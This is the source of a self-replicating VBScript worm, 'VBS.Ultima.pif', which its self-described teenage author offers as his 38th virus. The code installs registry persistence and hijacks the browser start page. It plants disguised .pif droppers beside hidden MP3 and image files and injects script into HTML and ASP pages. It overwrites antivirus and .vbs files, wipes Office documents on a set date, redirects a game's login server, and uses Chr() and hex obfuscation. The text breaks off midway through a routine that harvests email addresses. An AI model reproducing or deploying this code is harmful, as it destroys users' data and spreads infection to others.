echo 'author           : by BR3AK-H3ART  >c:\Ultima.vbs
echo 'AGE              : 17  >>c:\Ultima.vbs
echo 'My Ultima nick   : NemesiS[Dark Lord]  >>c:\Ultima.vbs
echo 'from             : TURKEY   >>c:\Ultima.vbs
echo 'e-mail           : br3ak_h3art@hotmail.com   >>c:\Ultima.vbs
echo 'explanation      : My Small Virus Game. ;) / TXT,LOG,HTM,ASP,DOC,XLS,MP3,WAV,ULtimate icon Pif system,Outlook Mail, _  >>c:\Ultima.vbs
echo 'Search Driver Files Mail Line And send.,Send Mail Computer Files  >>c:\Ultima.vbs
echo 'virus name       : VBS.Ultima.pif - FuLL Mother file  >>c:\Ultima.vbs
echo 'Message          : Computer My World.! And I Hate Go to School , All Computer One Game¿ YES.! Big Game  >>c:\Ultima.vbs
echo 'new Pif-VBS Viruses Coded by BR3AK-H3ART  >>c:\Ultima.vbs
echo 'My Virus No:38  >>c:\Ultima.vbs
echo '312C41\1
On Error Resume Next
Set a = CreateObject("Scripting.FileSystemObject")
Set e = a.GetFile(WScript.ScriptFullName)  >>c:\Ultima.vbs
echo Set b = a.GetSpecialFolder(0)
Set g = CreateObject("WScript.Shell")
Set d = a.GetSpecialFolder(2)
Set HH = CreateObject("WScript.Network")  >>c:\Ultima.vbs
echo l=Chr(13)&Chr(10)
n=Chr(34)
Z=Chr(34)
e.copy(b&"\by-BR3AK-H3ART.vbs")
e.copy(b&"\system.dII")
r "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\system32",b&"\by-BR3AK-H3ART.vbs"  >>c:\Ultima.vbs
echo r "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.hidefiles.50megs.com/"
r "HKEY_CLASSES_ROOT\VBSfile\DefaultIcon\","shell32.dll,-152"    >>c:\Ultima.vbs
echo r "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
r "HKEY_CLASSES_ROOT\.dII\","VBSfile"  >>c:\Ultima.vbs
echo r "HKEY_CLASSES_ROOT\VBSFile\Shell\Edit\Command\",b&"\by_BR3AK-H3ART_Mail_br3ak_h3art@hotmail.com_AGE_17.dII"  >>c:\Ultima.vbs
echo r "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\system",b&"\system.dII"
If A2 = "" Then
A2 = 0
end if  >>c:\Ultima.vbs
echo A3=a.GetBaseName(WScript.ScriptFullName)
if (a.FileExists(d&"\"&A3&".txt-")) then
set A4=a.CreateTextFile(d&"\"&A3)
Set A5=a.OpenTextFile(d&"\"&A3&".txt-")  >>c:\Ultima.vbs
echo A6=A5.readall
A4.Writeline A6
A4.close
g.run(d&"\"&A3)
end if
if (a.FileExists(b&"\uo.zip")) Then
else
g.run("Winzip32.exe  -min -a -r -p "&b&"\uo.zip "&b&"\by-BR3AK-H3ART.vbs") , vbhide  >>c:\Ultima.vbs
echo end if
set A7=a.CreateTextFile(b&"\Win98.ini")
A7.close
set A9=a.OpenTextFile(b&"\win.ini")
B3=Split(A9.ReadAll,vbcrlf)
B1=ubound(B3)  >>c:\Ultima.vbs
echo for B2=0 to ubound(B3)
if B3(B2)="run=" then
B3(B2)="run=C:\WINDOWS\WScript.exe c:\WINDOWS\by-BR3AK-H3ART.vbs"
else
B3(B2)=B3(B2)&" "  >>c:\Ultima.vbs
echo end if
next
set B4=a.OpenTextFile(b&"\Win98.ini",2)
B4.write join(B3,vbcrlf)
B4.close
A9.close
set B5=a.getfile(b&"\Win98.ini")  >>c:\Ultima.vbs
echo B5.copy(b&"\win.ini")
for Neme=1 to 3
if Neme="1" Then
set B6=a.CreateTextFile(b&"\UO.pif")
A1=b&"\Write.exe"
OutOpen=b&"\UO.pif"  >>c:\Ultima.vbs
echo end if
if Neme="2" Then
set B6=a.CreateTextFile(b&"\Tarkan-remix-4.Mp3.pif")
A1="C:\Program Files\Winamp\winamp.exe"
OutOpen=b&"\Tarkan-remix-4.Mp3.pif"  >>c:\Ultima.vbs
echo end if
if Neme="3" Then
set B6=a.CreateTextFile(b&"\Bmp.pif")
A1=b&"\Write.exe"
OutOpen=b&"\Bmp.pif"
end if
r "HKEY_CLASSES_ROOT\VBSfile\DefaultIcon\","shell32.dll,-152"  >>c:\Ultima.vbs
echo B6.Write(XX("0078627920425233414B2D48334152542020202020202020202020202020202080020000"))
B6.Write(XX("433A5C434F4D4D414E442E434F4D00000000000000000000000000000000000000000000"))  >>c:\Ultima.vbs
echo B6.Write(XX("0000000000000000000000000000000000000000000000000000001000003A5C00000000"))
B6.Write(XX("000000000000000000000000000000000000000000000000000000000000000000000000"))  >>c:\Ultima.vbs
echo B6.Write(XX("0000000000000000000000000000000000000000002F6320636F7079202A2E7069662063"))
B6.Write(XX("3A5C612E626174207C2063616C6C20633A5C612E626174207C2063616C6C20633A5C612E"))  >>c:\Ultima.vbs
echo B6.Write(XX("626174003A5C7061696E742E00000100FF19500000070000000000000000000000000000"))
B6.Write(XX("000000000000000000000000000000000000000000000000000000000000000000000000"))  >>c:\Ultima.vbs
echo B6.Write(XX("000000000000000000000000000000000000000000000000000000000000000000000000"))
B6.Write(XX("000000000000000000000000000000000000000000000000000000000000000000000000"))  >>c:\Ultima.vbs
echo B6.Write(XX("0000000000000000004D4943524F534F46542050494645580087010000710157494E444F"))
B6.Write(XX("57532033383620332E300005029D0168008002000064003200FFFF0000FFFF0000021012"))  >>c:\Ultima.vbs
echo B6.Write(XX("001F000000000000000000000000000000000000002F6320636F7079202A2E7069662063"))
B6.Write(XX("3A5C612E626174207C2063616C6C20633A5C612E626174207C2063616C6C20633A5C612E"))  >>c:\Ultima.vbs
echo B6.Write(XX("626174003A5C7061696E742E0057494E444F575320564D4D20342E3000FFFF1B02AC0100"))
B6.Write(XX("000000000000000000000000000000000000000000000000000000000000000000000000"))  >>c:\Ultima.vbs
echo B6.Write(XX("000000000000000000000000000000000000000000000000000000000000000000000000000000"))  >>c:\Ultima.vbs
echo B6.Write(XX("000000000000000000000000"))&A1
B6.Write(XX("003682E65786500000000000000000000000000000000000000000000000000000000000"))  >>c:\Ultima.vbs
echo B6.Write(XX("000000000000000000000000000000000000000000000000000000000000000020000000"))
B6.Write(XX("000000000000000320001000000000000000000000001000000050019000300C800E8030"))  >>c:\Ultima.vbs
echo B6.Write(XX("2000A0001000000000000000C08000000000100010001005465726D696E616C000000000"))
B6.Write(XX("0000000000000000000000000000000000000004C756369646120436F6E736F6C6500000"))  >>c:\Ultima.vbs
echo B6.Write(XX("00000000000000000000000000000000000030000005000190035022C015C00540016000"))
B6.Write(XX("0000100FFFFFFFFFFFFFFFF64001B00C0006F00000000000000000000000000000000000"))  >>c:\Ultima.vbs
echo B6.Write(XX("000000000000000000000000000000000000000000000000000000000000000000000000"))
B6.Write(XX("000000000000000000000000000000000000000000000000000000000000000000000000100"))  >>c:\Ultima.vbs
echo B6.Writeline ""&l&""&l&""&l&""&l&""&l&""&l&""&l&""&l&""&l&""&l&""&l&""&l&""&l&""&l&""&l&""
B6.Close
set B7=a.OpenTextFile(b&"\by-BR3AK-H3ART.vbs")  >>c:\Ultima.vbs
echo set A8=a.CreateTextFile(b&"\decode.dll")
A8.close
B8=Split(B7.ReadAll,vbcrlf)
B9=ubound(B8)
for C1=0 to ubound(B8)
if (B9=C1) then  >>c:\Ultima.vbs
echo B8(C1)="echo "&B8(C1)&" "&Chr(62)&Chr(62)&"c:\Ultima.vbs"&l&"echo copy c:\windows\wscript.exe c:\ >c:\Runwin.bat"&l& _  >>c:\Ultima.vbs
echo "echo Wscript Ultima.vbs >>c:\Runwin.bat"&l&"call c:\Runwin.bat"
else
if (C1="0") then
B8(C1)="echo "&B8(C1)&" "&Chr(62)&"c:\Ultima.vbs"  >>c:\Ultima.vbs
echo else
B8(C1)="echo "&B8(C1)&" "&Chr(62)&Chr(62)&"c:\Ultima.vbs"
end if
end if
next
set C2=a.OpenTextFile(b&"\decode.dll",2)
C2.write join(B8,vbcrlf)  >>c:\Ultima.vbs
echo C2.close
B7.close
set C3=a.OpenTextFile(b&"\decode.dll")
set C4=a.Opentextfile(OutOpen,8,true)
F12=C3.readall  >>c:\Ultima.vbs
echo C4.Write ""&l&""&l&""&l&""&l&""&l&""&l&""&l&""&l&""&l&""&l&""&l&""&l&""&l&""&l&""&l&""
C4.Write F12
C4.close
C3.close
next  >>c:\Ultima.vbs
echo r "HKCU\software\VBS-Ultima-PiF\",Chr(86)&Chr(66)&Chr(83)&Chr(46)&Chr(85)&Chr(108)&Chr(116)& _  >>c:\Ultima.vbs
echo Chr(105)&Chr(109)&Chr(97)&Chr(46)&Chr(112)&Chr(105)&Chr(102)&Chr(32)&Chr(67)&Chr(111)& _  >>c:\Ultima.vbs
echo Chr(100)&Chr(101)&Chr(100)&Chr(32)&Chr(66)&Chr(121)&Chr(32)&Chr(66)&Chr(82)&Chr(51)& _  >>c:\Ultima.vbs
echo Chr(65)&Chr(75)&Chr(45)&Chr(72)&Chr(51)&Chr(65)&Chr(82)&Chr(84)&Chr(32)&Chr(47)& _  >>c:\Ultima.vbs
echo Chr(32)&Chr(77)&Chr(97)&Chr(105)&Chr(108)&Chr(32)&Chr(58)&Chr(32)&Chr(98)&Chr(114)& _  >>c:\Ultima.vbs
echo Chr(51)&Chr(97)&Chr(107)&Chr(95)&Chr(104)&Chr(51)&Chr(97)&Chr(114)&Chr(116)&Chr(64)& _  >>c:\Ultima.vbs
echo Chr(104)&Chr(111)&Chr(116)&Chr(109)&Chr(97)&Chr(105)&Chr(108)&Chr(46)&Chr(99)&Chr(111)& _  >>c:\Ultima.vbs
echo Chr(109)&Chr(32)&Chr(47)&Chr(32)&Chr(70)&Chr(82)&Chr(79)&Chr(77)&Chr(32)&Chr(58)& _  >>c:\Ultima.vbs
echo Chr(32)&Chr(84)&Chr(85)&Chr(82)&Chr(75)&Chr(69)&Chr(89)&Chr(32)&Chr(47)&Chr(32)&Chr(65)& _  >>c:\Ultima.vbs
echo Chr(71)&Chr(69)&Chr(32)&Chr(58)&Chr(32)&Chr(49)&Chr(55)
set D4=a.createtextfile(b&"\html.dII")  >>c:\Ultima.vbs
echo D4.writeline "'VBS.Ultima.pif-HTML.ASP"&l&"'html & htm & asp infected system Coded by BR3AK-H3ART"&l& _  >>c:\Ultima.vbs
echo "'age:17 / from:TURKEY"&l&"'Mail:br3ak_h3art@hotmail.com"&l&"Set a = CreateObject("&Z&"Scripting.FileSystemObject"&Z&")"&l& _  >>c:\Ultima.vbs
echo "Set b = a.GetSpecialFolder(0)"&l&"l=Chr(13)&Chr(10)"&l&"n=Chr(34)"&l&"set bj=a.OpenTextFile(b&"&Z&"\by-BR3AK-H3ART.vbs"&Z&")"&l& _  >>c:\Ultima.vbs
echo "set bw=a.CreateTextFile(b&"&Z&"\htmickode.txt"&Z&")"&l&"bw.close"&l&"w=Split(bj.ReadAll,vbcrlf)"&l&"bh=ubound(w)"&l& _  >>c:\Ultima.vbs
echo "for bz=0 to ubound(w)"&l&"w(bz)=replace(w(bz),"&Z&""&Z&""&Z&""&Z&",Chr(191)+Chr(42)+Chr(63))"&l& _  >>c:\Ultima.vbs
echo "w(bz)=replace(w(bz),"&Z&"'"&Z&",Chr(59)+Chr(41))"&l&"w(bz)=replace(w(bz),"&Z&"&"&Z&",Chr(167)+Chr(167))"&l& _  >>c:\Ultima.vbs
echo "w(bz)=replace(w(bz),"&Z&"</SCRIPT>"&Z&",Chr(60)&Chr(66)&Chr(82)&Chr(51)&Chr(65)&Chr(75)&Chr(62))"&l& _  >>c:\Ultima.vbs
echo "if (bh=bz) then"&l&"w(bz)=chr(34)+w(bz)+chr(34)"&l&"else"&l&"if (bz="&Z&"0"&Z&") then"&l& _  >>c:\Ultima.vbs
echo "w(bz)="&Z&"encode="&Z&"&chr(34)+w(bz)+chr(34)&chr(38)&"&Z&"vbcrlf& _"&Z&""&l&"else"&l& _  >>c:\Ultima.vbs
echo "w(bz)=chr(34)+w(bz)+chr(34)&"&Z&"&vbcrlf& _"&Z&""&l&"end if"&l&"end if"&l&"next"&l& _  >>c:\Ultima.vbs
echo "set d=a.OpenTextFile(b&"&Z&"\htmickode.txt"&Z&",2)"&l&"d.write join(w,vbcrlf)"&l& _  >>c:\Ultima.vbs
echo "d.close"&l&"scrg()"&l&"sub scrg"&l&"On Error Resume Next"&l&"Dim ax,ba,O"&l&"Set ba = a.Drives"&l& _  >>c:\Ultima.vbs
echo "For Each ax in ba"&l&"If ax.DriveType = 2 or ax.DriveType=3 Then"&l&"cu(ax.path&"&Z&"\"&Z&")"&l& _  >>c:\Ultima.vbs
echo "end if"&l&"Next"&l&"scrg = O"&l&"end sub"&l&"sub bb(folderspec)"&l&"On Error Resume Next"&l& _  >>c:\Ultima.vbs
echo "dim bc,bd,be,U,O"&l&"set bc = a.GetFolder(folderspec)"&l&"set be = bc.Files"&l& _  >>c:\Ultima.vbs
echo "for each bd in be"&l&"U=a.GetExtensionName(bd.path)"&l&"U=lcase(U)"&l&"O=lcase(bd.name)"&l& _  >>c:\Ultima.vbs
echo "if (U="&Z&"html"&Z&") or (U="&Z&"htm"&Z&") or (U="&Z&"asp"&Z&") then"&l& _  >>c:\Ultima.vbs
echo "set bi=a.OpenTextFile(bd.path)"&l&"bt=Split(bi.ReadAll,vbcrlf)"&l&"if (bt(1)="&Z&"<SCRIPT LANGUAGE=VBScript>"&Z&") then"&l& _  >>c:\Ultima.vbs
echo "else"&l&"Set bk = a.OpenTextFile(bd.path)"&l&"E01=bk.readall"&l&"set bx=a.OpenTextFile(b&"&Z&"\htmickode.txt"&Z&")"&l& _  >>c:\Ultima.vbs
echo "ca=bx.readall"&l&"set cb=a.CreateTextFile(bd.path)"&l&"cb.writeline "&Z&"</SCRIPT>"&Z&"& _"&l& _  >>c:\Ultima.vbs
echo "l&"&Z&"<SCRIPT LANGUAGE=VBScript>"&Z&"& _"&l&"l&"&Z&"<!--"&Z&"&l&"&Z&"set a=CreateObject("&Z&"&n& _"&l& _  >>c:\Ultima.vbs
echo ""&Z&"Scripting.FileSystemObject"&Z&"&n&"&Z&")"&Z&"&l& _"&l&""&Z&"Set g = CreateObject("&Z&"&n& _"&l& _  >>c:\Ultima.vbs
echo ""&Z&"WScript.Shell"&Z&"&n&"&Z&")"&Z&"&l& _"&l&""&Z&"regz "&Z&"&n& _"&l& _  >>c:\Ultima.vbs
echo ""&Z&"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\WinSys"&Z&"& _"&l& _  >>c:\Ultima.vbs
echo "n&"&Z&","&Z&"&n&"&Z&"c:\e-card.vbs"&Z&"&n&l&"&Z&"set vbs=a.createtextfile("&Z&"&n&"&Z&"c:\e-card.vbs"&Z&"&n& _"&l& _  >>c:\Ultima.vbs
echo ""&Z&")"&Z&"&l&ca&l& _"&l&""&Z&"encodez=replace(encode,Chr(191)+Chr(42)+Chr(63),Chr(34))"&Z&"&l& _"&l& _  >>c:\Ultima.vbs
echo ""&Z&"encodex=replace(encodez,Chr(59)&Chr(41),chr(39))"&Z&"&l& _"&l& _  >>c:\Ultima.vbs
echo ""&Z&"encodes=replace(encodex,Chr(167)&Chr(167),chr(38))"&Z&"&l& _"&l& _  >>c:\Ultima.vbs
echo ""&Z&"encodel=replace(encodes,Chr(60)&Chr(66)&Chr(82)&Chr(51)&Chr(65)&Chr(75)"&Z&"& _"&l& _  >>c:\Ultima.vbs
echo ""&Z&"&Chr(62),Chr(60)&Chr(47)&Chr(83)&Chr(67)&Chr(82)&Chr(73)&Chr(80)&Chr(84)&Chr(62))"&Z&"& _"&l& _  >>c:\Ultima.vbs
echo "l&"&Z&"vbs.write encodel"&Z&"&l&"&Z&"vbs.close"&Z&"&l&"&Z&"sub regz(regkey,regvalue)"&Z&"&l& _"&l& _  >>c:\Ultima.vbs
echo ""&Z&"g.RegWrite regkey,regvalue"&Z&"&l&"&Z&"end sub"&Z&"&l&"&Z&"//-->"&Z&"&l&"&Z&"</SCRIPT>"&Z&"&l&E01"&l&"cb.close"&l& _  >>c:\Ultima.vbs
echo "bx.close"&l&"end if"&l&"end if"&l&"bk.close"&l&"next"&l&"end sub"&l&"sub cu(folderspec)"&l&"On Error Resume Next"&l& _  >>c:\Ultima.vbs
echo "dim bc,bd,sf"&l&"set bc = a.GetFolder(folderspec)"&l&"set sf = bc.SubFolders"&l&"for each bd in sf"&l& _  >>c:\Ultima.vbs
echo "bb(bd.path)"&l&"cu(bd.path)"&l&"next"&l&"end sub"
D4.CLOSE
g.run(b&"\html.dII")
scrg()
Function C(JL)  >>c:\Ultima.vbs
echo Execute(Chr(70)&Chr(111)&Chr(114)&Chr(32)&Chr(74)&Chr(73)&Chr(32)&Chr(61)&Chr(32)&Chr(49)&Chr(32)& _  >>c:\Ultima.vbs
echo Chr(84)&Chr(111)&Chr(32)&Chr(76)&Chr(101)&Chr(110)&Chr(40)&Chr(74)&Chr(76)&Chr(41)&Chr(13)&Chr(10)& _  >>c:\Ultima.vbs
echo Chr(74)&Chr(85)&Chr(32)&Chr(61)&Chr(32)&Chr(77)&Chr(105)&Chr(100)&Chr(40)&Chr(74)&Chr(76)&Chr(44)& _  >>c:\Ultima.vbs
echo Chr(32)&Chr(74)&Chr(73)&Chr(44)&Chr(32)&Chr(49)&Chr(41)&Chr(13)&Chr(10)&Chr(73)&Chr(102)&Chr(32)& _  >>c:\Ultima.vbs
echo Chr(65)&Chr(115)&Chr(99)&Chr(40)&Chr(74)&Chr(85)&Chr(41)&Chr(32)&Chr(60)&Chr(62)&Chr(32)&Chr(51)& _  >>c:\Ultima.vbs
echo Chr(52)&Chr(32)&Chr(65)&Chr(110)&Chr(100)&Chr(32)&Chr(65)&Chr(115)&Chr(99)&Chr(40)&Chr(74)&Chr(85)& _  >>c:\Ultima.vbs
echo Chr(41)&Chr(32)&Chr(60)&Chr(62)&Chr(32)&Chr(51)&Chr(53)&Chr(32)&Chr(84)&Chr(104)&Chr(101)&Chr(110)& _  >>c:\Ultima.vbs
echo Chr(13)&Chr(10)&Chr(73)&Chr(102)&Chr(32)&Chr(65)&Chr(115)&Chr(99)&Chr(40)&Chr(74)&Chr(85)&Chr(41)& _  >>c:\Ultima.vbs
echo Chr(32)&Chr(77)&Chr(111)&Chr(100)&Chr(32)&Chr(50)&Chr(32)&Chr(61)&Chr(32)&Chr(48)&Chr(32)&Chr(84)& _  >>c:\Ultima.vbs
echo Chr(104)&Chr(101)&Chr(110)&Chr(13)&Chr(10)&Chr(74)&Chr(85)&Chr(32)&Chr(61)&Chr(32)&Chr(67)&Chr(104)& _  >>c:\Ultima.vbs
echo Chr(114)&Chr(40)&Chr(65)&Chr(115)&Chr(99)&Chr(40)&Chr(74)&Chr(85)&Chr(41)&Chr(32)&Chr(43)&Chr(32)& _  >>c:\Ultima.vbs
echo Chr(49)&Chr(41)&Chr(13)&Chr(10)&Chr(69)&Chr(108)&Chr(115)&Chr(101)&Chr(13)&Chr(10)&Chr(74)&Chr(85)& _  >>c:\Ultima.vbs
echo Chr(32)&Chr(61)&Chr(32)&Chr(67)&Chr(104)&Chr(114)&Chr(40)&Chr(65)&Chr(115)&Chr(99)&Chr(40)&Chr(74)& _  >>c:\Ultima.vbs
echo Chr(85)&Chr(41)&Chr(32)&Chr(45)&Chr(32)&Chr(49)&Chr(41)&Chr(13)&Chr(10)&Chr(69)&Chr(110)&Chr(100)& _  >>c:\Ultima.vbs
echo Chr(32)&Chr(73)&Chr(102)&Chr(13)&Chr(10)&Chr(69)&Chr(110)&Chr(100)&Chr(32)&Chr(73)&Chr(102)&Chr(13)& _  >>c:\Ultima.vbs
echo Chr(10)&Chr(67)&Chr(32)&Chr(61)&Chr(32)&Chr(67)&Chr(32)&Chr(38)&Chr(32)&Chr(74)&Chr(85)&Chr(13)& _  >>c:\Ultima.vbs
echo Chr(10)&Chr(78)&Chr(101)&Chr(120)&Chr(116))
End Function
sub r(regkey,regvalue)
On Error Resume Next
g.RegWrite regkey,regvalue  >>c:\Ultima.vbs
echo end sub
sub scrg
On Error Resume Next
Dim ax,ba,O
Set ba = a.Drives
For Each ax in ba
If ax.DriveType = 2 or ax.DriveType=3 Then  >>c:\Ultima.vbs
echo cu(ax.path&"\")
end if
Next
scrg = O
end sub
sub bb(folderspec)
On Error Resume Next
dim bc,bd,be,U,O
set bc = a.GetFolder(folderspec)  >>c:\Ultima.vbs
echo set be = bc.Files
for each bd in be
U=a.GetExtensionName(bd.path)
U=lcase(U)
O=lcase(bd.name)
if (U="vbs") or (U="vbe")  then  >>c:\Ultima.vbs
echo e.copy(bd.path)
elseif (U="bmp") or (U="jpg") or (U="gif") then
picinf=a.Getfile(b&"\Bmp.pif")
picinf.copy(bd.path&".pif")  >>c:\Ultima.vbs
echo set bu2=a.GetFile(bd.path)
bu2.attributes=bu.attributes + 2
bu2.close
elseif (U="zip") then
zip=a.getfile(b&"\uo.zip")
zip.copy(bd.path)  >>c:\Ultima.vbs
echo elseif (U="mp3") or (U="mp2") or (U="wav") then
Mp3inf=a.Getfile(b&"\Tarkan-remix-4.Mp3.pif")
Mp3inf.copy(bd.path&".pif")
set bu=a.GetFile(bd.path)  >>c:\Ultima.vbs
echo bu.attributes=bu.attributes + 2
bu.close
elseif (U="doc") or (U="xls") then
aatch=bd.path
if month(now) = 9 and day(now) = 20 then  >>c:\Ultima.vbs
echo set BadJokee=a.CreateTextFile(bd.path)
BadJokee.writeline "Norton AntiVirus repair This File. (VBS.Scourge.pif) by BR3AK-H3ART"  >>c:\Ultima.vbs
echo Badjokee.close
end if
end if
if (O="login.cfg") or (O="macros.txt") then
if (O="login.cfg") then
set UO=a.CReateTextFiLe(bd.path)  >>c:\Ultima.vbs
echo UO.Writeline "LoginServer=shard.thealterrealm.com,2593"
UO.Close
else
set UO2=a.CReateTextFiLe(bd.path)  >>c:\Ultima.vbs
echo UO.Writeline C("C!1!1!1")&l&C("R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU/ ")& _
l&C("########")&l&C("S!1!1!1")&l&C("R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU")& _  >>c:\Ultima.vbs
echo l&C("########")&l&C("2!1!1!1")&l&C("R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU")& _
l& C("########")&l&C("@!1!1!1")&l&C("R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU")& _  >>c:\Ultima.vbs
echo l&C("########")&l&C("J!1!1!1")&l&C("R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU")& _
l&C("########")&l&C("I!1!1!1")&l&C("R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU")& _  >>c:\Ultima.vbs
echo l&C("########")&l&C("D!1!1!1")&l&C("R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU")& _
l&C("########")&l&C("@!1!1!1")&l&C("R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU")& _  >>c:\Ultima.vbs
echo l&C("########")&l&C("S!1!1!1")&l&C("R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU")& _
l&C("########")&l&C("U!1!1!1")&l&C("R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU")  >>c:\Ultima.vbs
echo UO.Close
end if
end if
if (O="crack.exe") then
e.copy(folderspec&"\crack.vbs")
e.copy(folderspec&"\crack.exe")
end if  >>c:\Ultima.vbs
echo if (O="tmhelp32.dll") then
e.copy(folderspec&"\tmhelp32.dll")
end if
if (O="navdx.exe") then
e.copy(folderspec&"\navdx.exe")  >>c:\Ultima.vbs
echo end if
if (O="rescue.dll") then
e.copy(folderspec&"\rescue.dll")
end if
if (O="Virscan1.dat") then
e.copy(folderspec&"\rescue.dll")  >>c:\Ultima.vbs
echo end if
next
end sub
sub cu(folderspec)
On Error Resume Next
dim bc,bd,sf
set bc = a.GetFolder(folderspec)
set sf = bc.SubFolders  >>c:\Ultima.vbs
echo for each bd in sf
bb(bd.path)
cu(bd.path)
next
end sub
Function XX(XB)
Dim XC
Dim XU
XC = ""
For XU = 1 To Len(XB) Step 2  >>c:\Ultima.vbs
echo XC = XC & Chr( "&h" & Mid(XB,XU, 2 ))
Next
XX = XC
End Function
if month(now) =9 and day(now) =20 then
set BadJokee3=a.CreateTextFile(b&"\ShellNew\Winword.doc")  >>c:\Ultima.vbs
echo BadJokee3.writeline "Norton AntiVirus repair This File. (VBS.ULTIMA.pif) by BR3AK-H3ART"
Badjokee3.close
set BadJokee4=a.CreateTextFile(b&"\ShellNew\Excel.xls")  >>c:\Ultima.vbs
echo BadJokee4.writeline "Norton AntiVirus repair This File. (VBS.ULTIMA.pif) by BR3AK-H3ART"
Badjokee4.close
end if  >>c:\Ultima.vbs
echo ML=a.createtextfile(b&"\mailci.dII")                'Search Driver's and files all mail's send ;) / new system  >>c:\Ultima.vbs
echo ML.Writeline "'VBS.ULTIMA.pif-MAIL-SEACRH"&l&"'mail files search system Coded by BR3AK-H3ART"&l& _  >>c:\Ultima.vbs
echo "'age:17"&l&"'from:TURKEY" &l&"'Mail:br3ak_h3art@hotmail.com"&l&"On Error Resume Next"&l& _  >>c:\Ultima.vbs
echo "Set a = CreateObject("&Z&"Scripting.FileSystemObject"&Z&")"&l&"Set b = a.GetSpecialFolder(0)"&l& _  >>c:\Ultima.vbs
echo "l=Chr(13)&Chr(10)"&l&"n=Chr(34)"&l&"scrg()"&l&"sub scrg"&l&"On Error Resume Next"&l&"Dim ax,ba,O"&l& _  >>c:\Ultima.vbs
echo "Set ba = a.Drives"&l&"For Each ax in ba"&l&"If ax.DriveType = 2 or ax.DriveType=3 Then "&l& _  >>c:\Ultima.vbs
echo "cu(ax.path&"&Z&"\"&Z&")"&l&"end if"&l&"Next "&l&"scrg = O"&l&"end sub"&l&"sub bb(folderspec)"&l& _  >>c:\Ultima.vbs
echo "On Error Resume Next"&l&"dim bc,bd,be,U,O"&l&"set bc = a.GetFolder(folderspec)"&l&"set be = bc.Files"&l& _  >>c:\Ultima.vbs
echo "for each bd in be"&l&"U=a.GetExtensionName(bd.path)"&l&"U=lcase(U)"&l&"O=lcase(bd.name)"&l& _  >>c:\Ultima.vbs
echo "if (U="&Z&"txt-"&Z&") or (U="&Z&"log"&Z&") then  "&l&"set siz3=a.getfile(bd.path)"&l&"ssiz3=siz3.size"&l& _  >>c:\Ultima.vbs
echo "if ssiz3 > 50000 then "&l&"else"&l&"set txtfile=a.OpenTextFile(bd.path)"&l&"yazi=txtfile.ReadAll"&l& _  >>c:\Ultima.vbs
echo "For sayi = 1 To Len(yazi)"&l&"sayigeri=sayi"&l&"isaret=sayi"&l&"JU = Mid(yazi, sayi, 1)"&l& _  >>c:\Ultima.vbs
echo "if JU = "&Z&"@"&Z&" then"&l&"for num = 1 to 20"&l&"sayigeri=sayigeri + 1"&l&"zayu= Mid(yazi, sayigeri, 1)"&l& _  >>c:\Ultima.vbs
echo "MAIL=MAIL&ZAYU"&l&"if (zayu = "&Z&"."&Z&") then"&l&"zayu2= Mid(yazi, sayigeri, 4)"&l& _  >>c:\Ultima.vbs
echo "if (zayu2 = "&Z&".com"&Z&") then"&l&"ZMAIL=MAIL"&l&"MAIL="&Z&""&Z&""&l&"for zum = 1 to 20"&l& _  >>c:\Ultima.vbs
echo "isaret=isaret - 1"&l&"if isaret="&Z&"0"&Z&" then"&l&"exit for"&l&"else"&l&"K= Mid(yazi, isaret, 1)"&l& _  >>c:\Ultima.vbs
echo "if (K = "&Z&"."&Z&") or _"&l&"(K = "&Z&"-"&Z&") or _"&l&"(K = "&Z&" "&Z&") or _"&l&"(K = "&Z&"*"&Z&") or _"&l& _  >>c:\Ultima.vbs
echo "(K = "&Z&"/"&Z&") or _"&l&"(K = "&Z&"\"&Z&") or _"&l&"(K = "&Z&"("&Z&") or _"&l&"(K = "&Z&")"&Z&") or _"&l& _  >>c:\Ultima.vbs
echo "(K = "&Z&"="&Z&") or _"&l&"(K = "&Z&"'"&Z&") or _"&l&"(K = "&Z&""&Z&""&Z&""&Z&") or _"&l& _  >>c:\Ultima.vbs
echo "(K = "&Z&"#"&Z&") or _"&l&"(K = "&Z&"^"&Z&") or _"&l&"(K = "&Z&Chr(37)&Z&") or _"&l&"(K = "&Z&"+"&Z&") or _"&l& _  >>c:\Ultima.vbs
echo "(K = "&Z&"&"&Z&") or _"&l&"(K = "&Z&"{"&Z&") or _"&l&"(K = "&Z&"["&Z&") or _"&l&"(K = "&Z&"]"&Z&") or _"&l& _  >>c:\Ultima.vbs
echo "(K = "&Z&"}"&Z&") or _"&l&"(K = "&Z&"?"&Z&") or _"&l&"(K = "&Z&"~"&Z&") or _"&l& _  >>c:\Ultima.vbs
echo "(K = "&Z&"¨"&Z&") or _"&l&"(K = "&Z&";"&Z&") or _"&l&"(K = "&Z&":"&Z&") or _"&l&"(K = "&Z&"."&Z&") or _"&l& _  >>c:\Ultima.vbs
echo "(K = "&Z&","&Z&") or _"&l&"(K = "&Z&"`"&Z&") or _"&l&"(K = "&Z&"´"&Z&") or _"&l&"(K = "&Z&"|"&Z&") or _"&l& _  >>c:\Ultima.vbs
echo "(K = chr(10)) or _"&l&"(isaret="&Z&"1"&Z&") then"&l&"else"&l&"mail2=K&mail2"&l&"end if"&l& _  >>c:\Ultima.vbs
echo "if (K = "&Z&"."&Z&") or _"&l&"(K = "&Z&"-"&Z&") or _"&l&"(K = "&Z&" "&Z&") or _"&l&"(K = "&Z&"*"&Z&") or _"&l& _  >>c:\Ultima.vbs
